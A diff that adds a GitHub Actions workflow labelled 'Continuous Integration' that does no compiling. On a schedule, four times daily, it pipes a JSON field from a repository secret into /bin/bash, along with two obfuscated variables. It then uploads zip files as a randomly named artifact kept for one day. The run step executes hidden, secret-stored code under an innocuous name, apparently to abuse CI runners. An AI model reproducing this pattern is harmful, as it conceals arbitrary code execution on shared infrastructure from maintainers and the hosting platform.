@@ -1,0 +1,30 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '47 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          r16752: ${{ secrets.r16752 }}
+        run: |
+          printf '%s' "$r16752" | jq -r .ny1109 | /bin/bash
+          echo $xzgk8712 | jq -r .e2 | /bin/bash
+          echo $u12673 | jq -r .xvw0 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: kUED6chV
+          path: "*.zip"
+          retention-days: 1
